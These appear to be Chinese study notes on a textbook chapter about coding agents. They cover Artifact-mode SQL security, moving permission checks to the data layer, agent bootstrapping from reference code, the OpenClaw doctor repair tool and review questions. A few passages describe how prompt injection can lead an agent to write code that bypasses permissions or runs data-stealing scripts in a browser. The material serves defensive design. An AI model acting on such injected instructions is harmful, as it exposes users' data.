原文对第一种方案的批评很有分量。它看似更「智能」，效率却极低：查询结果可能包含数千行大表格，让 LLM 阅读后再用文字描述，不仅会消耗大量 token、耗费很长时间，更严重的是 LLM「抄写」数据时非常容易出错。模型复述一长串数字或表格时会像人一样抄漏、抄错、抄串行，而且它抄错的时候通常还很自信。

更优的方案是 **Artifact 模式**。Agent 不自己读数据，而是生成一段 SQL 查询代码，把这段代码作为一个独立的可执行产物（artifact）交给系统。系统拿着这段 SQL 直接去数据库查询，把查到的数据渲染成用户能看到的表格。整个过程中，数据从数据库直达用户界面，完全绕过了 LLM 这个「中间人」，LLM 只负责写查询语句，不需要亲自去读成千上万行数据再复述给用户，既快速又准确。

这个改动其实重新定义了 LLM 在系统里的角色。传统用法里它是数据处理者，数据流经它，读进来、理解、写出去，于是它既是瓶颈（慢、贵）也是误差源（抄错）；Artifact 模式把它改成代码生成者，它只产出「怎么处理数据」的指令，不接触数据本身，数据流和 LLM 就此彻底解耦：DB → 前端 → 可视化，全程不经过模型。快，是没有几千行数据过模型；准，是模型不参与数据传递；token 消耗也从 O(数据量) 降到了 O(代码长度)。

安全要求这一段是 Artifact 模式能否落地的关键，也最容易被略过。原文给的约束有几条：执行层应使用只读数据库账号；解析 SQL 并只允许经过批准的 SELECT 语句，拒绝 DDL、DML 和多语句查询；用户提供的值应由服务端参数化绑定；同时限制查询时间、返回行数以及可访问的表和时间范围；可视化代码应在隔离网络和文件系统的沙盒中运行，并且只能产生规定格式的结果。原文的总结句是：Artifact 模式缩短了数据路径，但不能替代权限检查与执行隔离。

缩短数据路径不等于安全，因为路径的终点是数据库和浏览器，这两个地方都有真实的破坏力。几类约束各管一段：只读账号是最粗的一道，从账号层面杜绝写操作；只允许经过批准的 SELECT 是在 SQL 语义层拦截，这和 5.1.9 讲的「语义解析而非关键字黑名单」是同一个思路，关键在于解析语句本身，靠 grep 关键字拦不住；服务端参数化绑定防的是注入，模型写出的 SQL 里如果带了用户提供的值，必须走参数绑定，不能字符串拼接；限额加沙盒限制的是破坏半径。那句总结语是整个小节的题眼，**性能优化不能顺手当成安全方案**。

图 5-9（原文插图，题为「SQL 查询 Agent 流程」）用上下两栏对比了两种模式：

| 对比项 | 传统模式：数据经过 LLM（图中标「✗ 低效」） | Artifact 模式：数据直达前端（图中标「✓ 高效」） |

ERP（企业资源规划）软件是企业的关键系统，目前一般使用 GUI 界面，复杂操作需多次鼠标点击。AI Agent 可将用户自然语言查询转换成 SQL 语句，实现自动化查询。实验要求建立 PostgreSQL 数据库，包含两个表：（1）员工表，包含员工 ID、姓名、部门、级别、入职日期、离职日期（空表示在职）；（2）工资表，包含员工 ID、发薪日期、工资（每月一条记录）。Agent 要自动回答十个问题，原文逐条列出如下：

#### 模式四：动态生成软件（终极应用与半定制）

代码生成能力的终极应用，是让 Agent 完全动态地、从零开始创建软件。原文举的例子是 Anthropic 的「Imagine with Claude」：用户提出需求，Claude 实时生成前端界面和交互逻辑，用户与生成的软件交互，Claude 修改代码生成新界面展示操作结果，整个过程中用户看到一个从无到有、持续演化的应用程序。原文随后给了一个务实的判断：这种完全动态生成的模式成本和延迟较高，更适合作为展示能力边界的实验。

更务实的方向是基于已有框架进行定制化修改。原文叫它「半定制」，它保留基础软件的稳定性，同时在特定维度上开放用户控制权。用户说「把按钮改成蓝色」「在侧边栏添加快捷菜单」「修改字体为更易读的样式」，Agent 理解需求并修改前端代码，**热加载**（HMR，Hot Module Replacement，局部热替换、保留应用状态、无需整页刷新即可生效）即时生效，一刀切的标准产品就此变成千人千面的个性化体验。

这个处理方式值得学：介绍一个前沿能力时，同时给出它的现实定位。半定制模式的聪明之处在于它不动基础软件，只在颜色、字体、布局、组件位置这些维度开放控制权，风险被限制在样式层，功能层还是原来那份经过测试的代码。HMR 在这里的角色和 5.2.4 的「热更新」完全一样，都是缩短反馈延迟。没有 HMR，改一次界面要走「改代码 → 构建 → 刷新页面 → 状态丢失」；有了 HMR，就变成「改代码 → 局部替换 → 状态还在」。原文特意解释了 HMR 的两个特性，局部热替换和保留应用状态，其中保留状态是关键：如果每次改动都刷新整页，用户之前填的表单、浏览到的位置全丢了，改一次界面就要重来一次。

#### 实验 5-14 ★★：对话式界面定制系统

实验目标是让用户能够通过自然语言对话即时定制软件界面，验证由热加载机制支持的代码生成能否有效提供个性化用户体验。技术方案是构建一个基础 chatbot 应用（React 前端 + FastAPI 后端），前后端均运行在开发模式下支持热加载（React 的 HMR，FastAPI 的 reload）。用户在对话中提出 UI 定制需求（颜色、字体、布局、组件位置等），Agent 自主修改代码；热加载机制自动检测文件变化，前端重新编译刷新，用户实时看到界面变化。方案还支持多轮迭代定制。

#### 动态生成软件的安全：信任边界下移到数据层

动态生成软件带来灵活性的同时，也改变了传统软件的安全前提。过去，应用的业务代码经过开发、审查、测试和部署后，在一段时间内基本保持稳定，所以权限判断通常写在应用层：业务代码先判断「当前用户能否读取或修改这条数据」，再向数据库发起操作。当接口、工作流乃至数据访问代码都由 Agent 随时生成或改写时，这一层不再稳定。原文列了三种失效方式：新生成的代码可能漏掉一项细微的权限检查、暴露原本不可见的字段，或者通过另一条调用路径绕开已有判断。原因是普通的生成错误，还是 Agent 受到提示注入后生成了危险代码，其实无关紧要，结果都一样：原本希望由业务代码维持的权限边界可能被悄然破坏。

安全目标因此要重新表述。原文给的说法是，动态生成软件的安全目标应该是「即使 AI 写错了代码，权限约束仍然无法被绕过」，而不能寄托在「保证 AI 每次都把权限检查写对」上。权限检查之所以不能留在应用层，是因为它本身就与被约束的代码处在同一个信任域里。提示词可以要求 Agent 检查权限，测试和代码审查也能降低出错概率，但这些手段很难穷尽每一条新生成的执行路径，构不成最终的安全边界。打个比方，这等于把守门员交给一个每天换人的岗位，守门的和被管的是同一批随时会重写的代码。

更稳妥的架构是把**信任边界下移到数据层**。原文明确指出，这是第一章三层护栏中最难被绕过的那一层。分工是这样的：动态生成的应用层可以负责界面、流程和业务编排，而真正决定「谁能对哪条数据做什么」的规则，由一层稳定、经过人类审查的机制强制执行。具体机制包括数据库的行级安全策略（可以限制用户只能访问所属租户的数据）、约束和校验器（可以拒绝非法状态）、受控视图、存储过程或数据访问服务（可以只暴露允许的操作）。

把这条逻辑链走一遍会更清楚。传统软件里「谁能读/写哪条数据」的判断写在业务代码里，这样写之所以合理，是因为业务代码稳定，写完、审过、测过、部署了，之后一段时间不变，「审查过它」这个假设成立。当业务代码由 Agent 随时生成或改写，这个假设就不成立了，每一版新代码都是一份没人看过的新代码。权限检查如果还留在应用层，就等于把守门员交给了每天换一个人的岗位。所以权限规则要放到应用层改不动的地方，也就是数据库的行级安全策略、约束、受控视图和存储过程，这些是稳定、经过人类审查的，不随每次代码生成而重写。

还有一条身份绑定的要求：每次读写都应携带由受信任运行时绑定的**访问上下文（access context）**，其中包含用户、租户、角色或 Agent 身份；动态生成的代码只能以这个受限身份访问数据，不能自行伪造身份，也不能获得可绕过规则的高权限数据库凭证。这样即使它完全漏写了权限判断，数据层仍会拒绝越权操作。「由受信任运行时绑定」这几个字很关键，它的意思是这份身份信息不能由生成代码自己填。让 Agent 生成的代码自己声明「我是租户 A」，它当然会声明自己是租户 A；身份必须由外面的、Agent 碰不到的运行时注入。这正好呼应 5.2.2 那句「最后一道防线必须建立在模型无法伪造的数据之上」，以及「独立性不仅指独立的模型，更指独立的数据来源」。

原文补了两条边界说明，避免把这条原则推成教条。权限下沉并不意味着所有业务逻辑都要塞进数据库：应用层仍可做权限预检查，以便尽早给用户反馈，但数据层必须保留最终裁决权，同一条规则可以在上层用于改善体验，在下层用于提供保证。另一个必要条件是，所有数据访问路径都必须经过受信任的数据层，不能让生成代码绕过它直连数据库。第二条其实最容易被破坏，只要有一个地方图省事用了直连，整道防线就形同虚设。**安全边界的强度等于最弱的那条路径。**

原文的收束是：由此，动态生成软件可以让上层持续变化，同时把不可违反的权限约束留在不会随每次生成而重写的数据层中。

#### 实验 5-15 ★★★：动态生成软件的权限内嵌数据对象

实验目标是构建一个允许应用层代码动态生成或重写、但仍能在数据层强制执行权限和数据完整性的对象存储，验证生成代码即使跳过状态机、写入越界数据或尝试跨租户读取，也不能突破稳定的数据层边界。技术方案是在 PostgreSQL 之上提供 Python 对象存储中间层，数据类型声明自己的权限规则、访问上下文、校验器、对象关系和后果反应，每次读写对象都依次经过权限与校验流水线、持久化及引用完整性校验等。验收标准是：合法的招聘流程更新成功；跳过候选人状态转换、写入超出职位范围的工资和跨租户读取均被数据层拒绝。

回到这一节的骨架：生成式 UI 是能力，声明式协议是它的安全补充，两者合起来才是一条完整路线。理解 5.2.5 的关键在于「直接生成 HTML/JS」和「生成界面描述清单」这两种做法在安全上的区别。Agent 生成 HTML/JS 时，它的输出是要被浏览器执行的代码，模型输出的每一个字符都直接进入了你的运行时环境，模型被注入也好，自己幻觉出问题也好，后果都是在用户的浏览器里执行任意代码；而 Agent 生成界面描述清单时，它的输出只是数据，客户端拿着这份数据，用自己预先写好、经过审查的原生组件去渲染。这两种做法的差别不在安全程度上，而在「模型能不能写代码」这个能力本身被取消了，它只能组合你允许的组件。

有几组概念容易混，值得单独对照一次。

生成式 UI 的两种实现，直接生成代码与声明式描述。前者灵活但危险，模型输出直接进入运行时，可能执行任意代码；后者安全但受限，只能用客户端预置的组件目录。原文给的适用边界很清楚：标准化的交互场景（表单、表格、卡片）用声明式，高度定制化的需求（自定义可视化、游戏界面）用直接生成代码。

A2UI 与 AG-UI。原文明确说这两者不是同类。A2UI 是界面描述语言，Agent 输出 JSON 界面清单，客户端用预置组件渲染；AG-UI 是事件/传输协议，把 Agent 的执行状态（消息、工具调用、状态补丁）流式推送到前端，它可以承载 A2UI 载荷。把它们并列为「两种声明式界面协议」是错的。

提示注入与 XSS。成因是提示注入，恶意指令混进了 Agent 的输入；效果是在浏览器执行恶意脚本、窃取数据，这一点类似 XSS。不能说整个攻击就叫 XSS，因为病灶和防御手段完全不同。

Artifact 模式与「Agent 执行 SQL 后描述结果」。前者让 LLM 只写代码、数据绕过 LLM 直达前端；后者让数据流经 LLM，LLM 读几千行再复述，代价是原文点明的三条：消耗大量 token、耗费很长时间、LLM 抄写数据时非常容易出错。

应用层权限检查与数据层权限执行。原文的关键区分是信任域。应用层的权限检查与被约束的业务代码处在同一个信任域，都会被 Agent 重写，所以不能作为最终边界；数据层的行级安全策略、约束、受控视图是稳定且经过人类审查的，才是最终裁决权所在。两层可以并存，上层改善体验、下层提供保证，但下层不能被绕过。

内科指标与结果指标。内科指标（训练/验证损失、梯度范数、学习率、困惑度、奖励、KL 散度、策略熵）反映的是训练过程本身是否正常；结果指标（任务准确率）反映的是最终表现。原文的类比是体检生理指标之于外在表现，内科指标能更早暴露问题。

这一节可以收在一个判断上：生成式 UI 把线性文本升级为可交互界面，但「直接生成可执行代码」有安全代价，所以标准化场景走声明式协议，Agent 只能点菜单上的菜；而当界面代码可以由 Agent 随时重写时，权限规则必须从应用层下沉到数据层，因为那里是 Agent 改不动、也绕不过的地方。

### 5.2.6 代码创造代码：Agent 自举

前面几节把代码生成用在了各个地方，从数学思考到文档创作再到界面定制。把这些能力推向极限，会浮出一个自然的问题：Agent 能不能用代码生成能力来创造另一个 Agent？

图 5-10（原文插图，题为「Agent 自举循环」）先画了一条从物理到智能的演化阶梯，再对比 DNA 自复制与 Agent 自举。

演化阶梯是：尘埃 → 恒星（物理定律）、恒星 → 行星（引力聚合）、行星 → 生命（DNA 自复制）、生命 → 智能体（代码自举）。每一级都标上了驱动机制，物理定律、引力聚合、DNA 自复制、代码自举。这是本章唯一一处类比性质的论证，用意在于每一级复杂度跃迁都对应一种新的自我构建机制，而代码自举被放在与 DNA 自复制同一层的位置上，意思是智能体开始能构造自己的同类，这在层级上与「生命开始能复制自己」相当。

两种自复制的对照如下：

| | DNA 自复制 | Agent 自举 |
| --- | --- | --- |
| 机制 | 随机变异 + 自然选择 | 理解代码 + 定向设计 |
| 特点 | 不理解自身 · 不能定向修改 · 37 亿年盲目试错 | 理解自身机制 · 有目的地创造 · 继承最佳实践 |

右半边这张对照才是重点，它讲的是代码自举比 DNA 自复制强在哪里。DNA 自复制的三个特征是不理解自身、不能定向修改、37 亿年盲目试错，它靠的是变异加选择：变异是随机的，改哪儿、改成什么不由自己决定，只有环境筛选提供了方向。Agent 自举的三个特征是理解自身机制、有目的地创造、继承最佳实践，因为代码是可读、可理解的，Agent 能看懂自己的架构，然后有目的地决定改哪里，想换成客服角色就改系统提示词，想加退款能力就加一个工具。变异在这里是定向的，随机不再参与。这是本节标题「代码创造代码」最核心的一层含义：因为自身的实现是代码，所以自身是可理解、可定向修改的对象。

图 5-10 的中间部分展示了自举的技术形态。一个 Agent 由四部分组成：系统提示词（角色与规则）、框架代码（Agent 循环）、工具定义加 MCP 集成加消息格式（基础设施）、业务逻辑。图中原始 Agent 的「自身代码」写着系统提示词「你是一个航空客服 / 取消规则: ... / 转接规则: ... / 工具: cancel_order」、Agent 框架代码 `loop: msg = llm(ctx) / if tool_call: exec(tool)`，以及工具定义、MCP 集成和消息格式，整块标注为「经过验证的高质量实现」。经过「复制 + 修改」，得到定向修改后的新 Agent：新系统提示词是「你是一个电商客服 / 退款规则: ... / 物流查询: ... / 工具: refund_order」，框架代码照旧是同样的 `loop`，再加上新工具和新业务逻辑，并标注「架构框架完全继承 → 质量有保障」。

自举的做法就是保留框架代码和基础设施，替换系统提示词和业务逻辑。图中从「航空客服 + cancel_order」变成「电商客服 + refund_order」，`loop` 一模一样。这个划分很有指导意义，它告诉你在造新 Agent 时哪些是可以改的（角色、工具、业务规则），哪些是不该改的（Agent 循环、消息格式、KV 优化）。图中那句「架构框架完全继承」，指的就是后者。

#### Agent 的自我修复：OpenClaw Doctor

Agent 自举的一个重要前提是自我修复能力，OpenClaw 的 doctor 命令正是这种能力的体现。它能自动检测三类问题：配置异常，包括过期的 OAuth token、遗留的配置格式、端口冲突；状态问题，包括陈旧的会话锁文件、插件依赖缺失；服务健康问题，包括网关未运行、沙盒镜像缺失。检测之后通过分层修复策略自动解决：安全的修复（配置归一化、锁文件清理）自动执行，有风险的操作（服务重启、强制覆盖配置）需要用户确认。

原文特意加了一段克制的澄清，主动防止夸大。它说要避免夸大 Agent 在自我修复能力中的作用：过期 token、锁文件、端口冲突这类高频问题，本身就有明确的检测规则和固定的修复动作，doctor 以一组确定性检查为基础先把它们覆盖掉，这与传统运维脚本并无本质不同。

真正体现 Agent 能力的是第二层：对确定性规则未覆盖的疑难问题，doctor 再把它交给 LLM 分析错误日志、理解配置文件的语义、推断问题的因果关系，生成针对性的修复方案。原文的分工总结是，确定性检查保证常见问题被稳定修复，LLM 兜底应对长尾疑难，两层配合，doctor --fix 才能自动解决相当一部分常见网关问题。

这个结构为什么值得坚持？因为两类问题的成本收益完全不同。高频常见问题发生频率高、原因确定、修复动作固定，对它们来说确定性检查便宜、快、100% 可靠，派 LLM 去处理则是贵的、慢的、还可能判断错，纯属浪费。长尾疑难问题发生频率低、原因不确定、修复动作需要推断，为它们写确定性规则的边际成本极高，要覆盖无穷多种情况；而读日志、理解语义、推断因果恰好是 LLM 擅长的。所以分流的依据是「问题是否已被规则覆盖」，跟「问题难不难」没关系。这也是工程上一条通用的分层原则：别让贵的手段去干便宜手段已经能干好的活。

原文的收束是：在这种「Agent 修复 Agent」的模式中，当 Agent 的工作对象不再是外部系统，而是它自身的运行环境时，自我修复能力就从系统适配器升级为 Agent 自举的基础设施。这句话把 5.2.4 的「系统适配器」和这一节的「自举」串了起来。两者的机制完全一样，都是发现问题再现场生成代码修复，区别只在作用对象：对象是外部系统时叫适配器（RPA、API 封装），对象是自己的运行环境时就成了自举的基础设施。一个 Agent 如果连自己的配置都修不好，就不可能可靠地造出另一个 Agent。

#### 让 Agent 编写 Agent 的关键技巧

创造高质量 Agent 远比生成普通应用代码复杂，因为它需要对 Agent 架构模式、最佳实践和常见陷阱有深入理解。缺了这种领域专业知识，即使最强大的代码生成模型也可能创造出架构上有严重缺陷的 Agent。原文列了四类常见缺陷。

上下文管理的随意性：未采用第二章讨论的标准上下文格式，把轨迹转为纯文本塞进上下文，忽略了结构化消息带来的 KV Cache 优化，工具调用循环还存在边界 bug。

工具设计的不规范：描述简略，缺少使用边界说明和负面清单，参数缺乏具体示例。

技术选型的滞后性：倾向于使用训练数据中最常见但已经过时的模型和 API。原文给的解决方案是维护 SOTA 知识库，或者赋予 Agent 搜索能力。

外部生态的脱节：使用废弃 API、不再维护的库，或者本身有缺陷的模式。

这四类缺陷反过来可以当成四条检查线，用来判断一个 Agent 实现是否专业。上下文管理看用的是标准结构化消息格式（能吃到 KV Cache 收益）还是把轨迹拼成纯文本，工具调用循环有没有边界 bug；工具设计看描述是否完整（有没有使用边界说明和负面清单）、参数有没有具体示例；技术选型看用的是不是当前推荐的模型和 API；外部生态看依赖的库还在不在维护、有没有用废弃 API。四类里有三类都是知识陈旧问题，选型滞后、生态脱节，以及工具设计里缺少新实践的痕迹。这解释了原文为什么把「维护 SOTA 知识库或赋予 Agent 搜索能力」当成第 3 条的解决方案：模型的知识截止在训练时，而技术栈在持续变化，这个缺口必须由外部信息源补上。

最有效的解决路径，原文明确说：比在提示词里穷尽所有规则更有效的做法，是提供高质量的 Agent 实现作为参考范例，引导代码生成 Agent 在此基础上修改，别从零开始。

基于范例的生成优势明显。范例代码本身就是最佳实践的载体，Agent 基于范例修改比从零编写更容易做对，架构上的好选择会自然保留下来，不必在提示词里把每一条规则都说清楚。为什么它会优于在提示词里穷尽规则？设想两种做法。

做法 A 是在系统提示词里写满规则：「请使用标准消息格式」「工具描述要包含边界说明和负面清单」「参数要给示例」「不要用废弃 API」「注意 KV Cache 优化」。这条路有三个问题：规则永远列举不完，你只能在踩到坑之后补上一条；模型要在生成代码的同时记得所有规则，注意力会被分散；规则是否正确应用无法验证，模型可能以为自己遵守了。

做法 B 是直接给一份高质量实现让模型改。范例里的每一条最佳实践都是以代码形态存在的，标准消息格式就在 `agent.py` 里，规范的工具体现在 `tools/*.py` 里，现代 API 写在 `config.yaml` 里。模型不需要「记住」这些规则，它只需要保留这些代码。更关键的是原文那句「架构上的好选择会自然保留下来」：默认行为变成了沿用好架构，而偏离好架构需要模型主动做额外的事；从零生成时默认行为是写出训练数据里最常见的写法，而这个写法很可能就是过时的、不规范的。这个差别是结构性的，范例把「正确的做法」变成了阻力最小的路径。

具体做法是：Agent 接到开发新 Agent 的任务时，先复制自己的代码（或其他经过验证的高质量 Agent 实现），再做针对性修改，调整系统提示词匹配新角色，替换或增删工具适应新功能，修改业务逻辑但保留架构框架。原文对这个模式的定性是「自我复制并适应性修改」，它既保证新 Agent 继承核心技术优势，又允许在特定维度上差异化，就像生物学中的基因复制加变异。

这个模式里两部分的工作量极不对称。看图 5-10，复制的是大量代码（框架循环、MCP 集成、消息格式），修改的是少量东西（系统提示词、工具集、业务逻辑）。效率正来自这个不对称：你不需要重新设计 Agent 架构，只需要重新描述这个 Agent 是谁、能做什么。基因复制加变异的类比在这里很贴切，复制保证遗传稳定性（核心技术优势不丢），变异保证适应性（能在特定维度差异化）；而且和生物一样，变异是局部的、定向的，不是从头重写整个基因组。

#### 实验 5-16 ★★★：开发一个能创造 Agent 的 Agent

实验目标是构建具备**元编程**（Metaprogramming，即编写能生成或修改其他程序的程序）能力的 Coding Agent，能根据用户需求自动创建新 Agent 系统，确保遵循最佳实践。技术方案是为 Coding Agent 提供高质量 Agent 实现作为参考范例（可使用 ch5/coding-agent 项目本身）；当接到创建新 Agent 的需求时，Agent 先复制这个范例代码，再基于用户的具体需求做针对性修改。验收标准是：生成的 Agent 能成功运行并完成基本任务；验证它采用标准消息格式和工具调用协议，使用当前推荐的模型和 API；测试多轮对话中上下文和状态管理的正确性；对比从零生成和基于范例修改两种模式，验证后者在质量和效率上的优势。

图 5-11（原文插图，题为「能创造 Agent 的 Agent 流水线」）画的是四步流程与产出对比：

| 步骤 | 图中的内容 |
| --- | --- |
| 用户需求 | 「创建一个电商退款客服 Agent」 |
| ① 阅读参考代码 | `read_file`：`agent.py`、`tools/*.py`、`system_prompt.md`、`config.yaml` → 理解架构模式 |
| ② 复制脚手架 | `cp -r reference/` → `new_agent/`，保留：Agent 循环框架、消息格式 / KV 优化 |
| ③ 定向修改 | `edit_file`：`system_prompt.md` → 电商退款规则；`tools/refund.py` → 新增退款工具；`config.yaml` |
| ④ 验证测试 | `bash`：`python agent.py` → 启动新 Agent → 发送测试消息 → 检查工具调用 → 验证对话流程 |

图右侧给出生成的新 Agent 的构成：`system_prompt.md`（电商退款规则）、`tools/refund.py`（退款 / 查询工具）、`agent.py`（继承框架代码）、`config.yaml`（模型 / 参数配置）。图底部对照两种路线：从零生成缺乏最佳实践（上下文管理随意 · 工具设计不规范 · API 过时）；基于范例修改继承最佳实践（标准消息格式 · 规范工具设计 · 现代 API）。

图 5-11 的四步流程本质上就是 5.1.3 那个 Coding Agent 工作流的一个特例，只是把「改一个仓库」换成了「造一个新 Agent」。第 ④ 步验证测试不能省，生成的 Agent 要真的跑起来、发一条测试消息、看它有没有正确调用工具、走完一轮对话，这对应 5.1.3 里「把『测试通过』而非『代码写完』定义为完成标准」的那条原则。

几组容易混的概念可以放在一起对照。

Agent 自举与 DNA 自复制。DNA 自复制是随机变异加自然选择，不理解自身、不能定向修改、37 亿年盲目试错；Agent 自举是理解代码加定向设计，理解自身机制、有目的地创造、继承最佳实践。核心区别在于修改是否定向，而这个差别来自「自身的实现是可读的代码」这一事实。

确定性检查与 LLM 兜底。OpenClaw doctor 的两层结构里，前一层处理的是高频、原因确定、修复动作固定的问题（过期 token、锁文件、端口冲突），原文明确说这与传统运维脚本并无本质不同，别把它当成 Agent 能力的体现；后一层处理的是确定性规则未覆盖的疑难问题，要分析错误日志、理解配置语义、推断因果关系。

基于范例修改与从零生成。图 5-11 底部做了对照，从零生成的结果是缺乏最佳实践，基于范例修改的结果是继承最佳实践。差异的根源是默认行为不同，范例模式下「保留好架构」是阻力最小的路径。

元编程与元能力。本节两个词都出现了，指向并不相同。元编程是实验 5-16 里明确定义的编程概念，即编写能生成或修改其他程序的程序，它描述的是一种代码能力；元能力是 5.2 开头定义的概念，即能创造其他能力的能力，它描述的是代码在 Agent 体系中的角色。元编程是元能力在「造 Agent」这个方向上的具体实现手段。

自我修复与 Agent 自举。两者是前提与目标的关系，原文说得很清楚：「Agent 自举的一个重要前提是自我修复能力。」自我修复（doctor）解决的是自己现在能不能跑，自举（造新 Agent）解决的是能不能造出同类。顺序上，前者是后者的基础设施。

整节读下来，Agent 自举就是「复制自己再定向修改」。因为自身的实现是代码，所以它能被理解、能被有目的地改写；这个能力的前提是自己先能修好自己；而最有效的实现方式，是给一份高质量范例，穷举提示词规则那条路走不通。

## 5.3 本章小结

原文把全章主线收在一句话上：代码不只是写程序的工具，它是 Agent 形式化思考和精确表达的语言。把代码当成一门语言来读，前面每一节都能挂到这句话上。5.1 回答的是拿这门语言干活需要配哪些工程设施，Harness、故障恢复、工具设计、安全都在这一侧；5.2 回答的是这门语言还能用来表达什么，思考、规则、多媒体、接口、界面，一直到 Agent 自身。七个核心工具（Code Interpreter、Bash Shell、读文件、写文件、编辑文件、Glob、Grep）是从浏览目录、读取代码、修改文件、运行命令、查找模式这五类操作推出来的，落到第四章的五类通用工具里，主要覆盖感知与执行两类。

Harness 那一节的结论被原文单独拎了出来：Coding Agent 成熟度高，靠的是软件工程几十年攒下的测试套件、类型系统、版本控制天然构成的一套 Harness。换个领域想让 Agent 达到同样的成熟度，值得先去补那个领域缺的验证基础设施，光等更强的模型没用。四类 Harness 组件可以当清单用，验收基线、执行边界、反馈信号、回退手段各占一格。表 5-1 是同一套思路的展开，目标明确又能自动验证的任务落在最佳区域，目标明确但只能人工验证的会卡在吞吐量上，目标模糊又能自动验证的会高效地跑偏，两头都缺的连启动都难。搜索和编辑这两块的细节也值得记住几个名字：四类搜索方式是正则内容匹配、文件名匹配、语义代码搜索、基于 AST 的符号查找，原文推荐的组合是从粗到细、从语义到语法；五种文件编辑方案里，Old String → New String 是 Claude Code 的做法，Diff + Apply 在 Cursor 上用过又被放弃，行号定位留给 IDE 深度集成的场景。工程实现上的五个技巧是并行与流式、上下文管理、环境感知、状态持久化、即时反馈。

故障与错误恢复那一节给出的是同一主题的另一面。原文的措辞是「Agent 的可靠性不取决于模型犯不犯错，而取决于每类故障是否都有对应的检测、恢复、接管与终止路径」。四层故障从下往上排是 API 层、工具层、上下文层和控制流层，工具层里那种反复撞同一个错、参数却一点不改的重试最危险，靠对「工具名+参数」算指纹、按恢复路径分别计失败次数就能把它认出来。熔断阈值定在连续 3 次，这个数来自真实会话统计：曾有一个会话连续失败三千余次，这类无效重试每天在全球浪费约 25 万次 API 调用，逾千个会话出现过 50 次以上连续失败。恢复能力分三级，静默重试、降级与接续，最后连同试过哪些办法一起暴露给用户；静默卡死交给空闲看门狗，超过设定时间没有新输出就杀掉挂起的流并重试，它比断开更难发现。接管的难处在于**文字能带走、凭证带不走**，中立轨迹格式正是为这件事设计的，思考拆成可移植的文字与不可移植的凭证，工具调用只记名称和参数，标识符在渲染时按目标厂商重新生成。

第二部分把代码生成在编程之外的价值摊成六个维度：思考工具、业务规则约束、多媒体生成、系统适配器、生成式 UI、Agent 自举。它们由内向外排开，从 Agent 自己想清楚问题，到把结论做成别人能看的东西，再到连上别人的系统、给别人可用的界面，最后到造出下一个 Agent；这条线也是代码作用半径不断扩大的过程。几个实验数字顺手记一下：代码辅助下的 K&K Puzzle 求解准确率超过 90%，PPT 的验收线是 10 到 20 页且至少 3 张原文图表，讲解视频 5 到 15 分钟且音画时长精确匹配，智能剪辑的起止点误差不超过 3 秒。

原文对代码价值的总结句是：它既是完成任务的手段，也是积累知识、创造工具、优化自身的机制。至此，上下文、知识、工具与代码能力已经组合成通用 Agent 的基础架构，代码生成是其中通用性最强的元能力。前五章默认 Agent 与世界轮流行动，第六章要把观察与动作空间扩展到异步事件、语音、屏幕和物理世界，第七章再转向评估与持续改进。

## 思考题

这九道题都来自原书，题号后面的星级是原文标注的难度。

1. ★★ 代码生成被称为 Agent 的「元能力」。但代码执行引入了安全风险——Agent 生成的代码可能包含漏洞、无限循环或资源耗尽。沙盒隔离能解决部分问题，但也限制了代码能力（比如无法访问网络或文件系统）。如何在安全性和能力之间找到最优平衡点？
2. ★★★ Agent 自举——能创造 Agent 的 Agent——实现了「智能的自我繁殖」。但每次自举都可能引入新的偏差或错误，这种错误会在代际间累积吗？如何防止 Agent 自举的退化？
3. ★★ 代码生成 Agent 在处理日志解析时，能自动跟随格式演化。但如果格式变化是一个 bug 而非预期改动，Agent 的适应性反而掩盖了问题。Agent 应该如何区分「需要适应的变化」和「需要报告的异常」？
4. ★★ 本章在 PPT 生成、视频编辑和日志可视化中反复使用提议者-审核者机制。如果 Reviewer 的审美偏好与目标用户不一致，比如 Reviewer 认为信息密度合理但用户觉得太拥挤，反馈循环会收敛到错误的局部最优。如何让用户的偏好反馈也参与 Reviewer 循环？
5. ★★ 本章展示了 Coding Agent 把执行和调试中获得的经验沉淀回代码库的多种方式——写入知识库文件、更新架构文档、维护项目指令文件、把操作序列固化为代码。如果把这些经验进一步提炼为系统提示词中的规则，规则集会随时间不断膨胀。如何对沉淀下来的规则做「垃圾回收」——识别并清理冗余或过时的条目？为什么一次成功的代码修改还不能直接视为第九章所说的持续进化？
6. ★ 「对远程工作友好的团队往往也对 AI Agent 友好。」你所在的团队或组织，在知识文档化方面距离「AI-ready」还有多远？最大的障碍是什么？
7. ★★★ Simon Willison 提出了 Agent 的「致命三要素」（访问私有数据、暴露于不受信任内容、具备外部通信能力），本章在此基础上增加了第四个——持久记忆。在一个需要同时处理这四种要素的生产环境中，你会如何设计安全策略？
8. ★★ Artifact 模式让 Agent 生成 SQL 或前端代码，由数据库和浏览器直接执行，绕过 LLM 处理大量数据。与传统的「Agent 直接给出答案」相比，这种「Agent 生成代码、系统执行代码」的分工有什么优劣？生成的 SQL 可能执行破坏性操作、生成的 HTML 可能包含漏洞，又该如何确保安全？
9. ★★ 将业务规则编码为工具内部基于数据库真值的校验，并用参数设计引导模型在调用前核对政策条件，本质上是用代码结构来约束 Agent 行为。这种「代码即规则」的模式相比自然语言规则有什么优势和局限？

下面这些是笔记自己补的思路提示，不是原书的参考答案。

1. 把问题拆成两半看。沙盒能挡住的是无限循环、资源耗尽、误删主系统文件，挡不住的是逻辑错误、数据外泄、在允许范围内的越权。再按「这类任务真正需要哪些能力」做能力分级，大部分任务只需要读文件和跑计算，不需要网络出口，只有装包、抓网页这类任务才值得按需放行。5.1.9 给的三个维度（网络出口、文件系统挂载范围、资源限额）可以分别取舍，每一档放宽都要说清楚换来了什么、代价是什么。
2. 先把「退化」的度量定义出来：用哪几项指标、在几代上测。防线有两条。一条在继承侧，新 Agent 是基于已验证范例复制加定向修改，还是从头生成（见图 5-10、5-11）；一条在验证侧，新 Agent 生成后有没有跑通基本任务的客观检验（见实验 5-16 的验收标准）。还值得想一层：「变异」是定向的还是随机的，这正好是原文对比 DNA 自复制与 Agent 自举时的分界点。
3. 抓手是判断格式的语义有没有被改变。可以设想一组判据：新增字段且旧解析仍能正确工作，大概率是预期演化；关键字段类型变化、必填项消失、结构层级被破坏，更可能是 bug。工程上有两个办法，把自适应和告警并行，先适应、同时把异常模式上报；适应的时候保留旧格式的回归样本，用重放验证有没有引入静默错误。
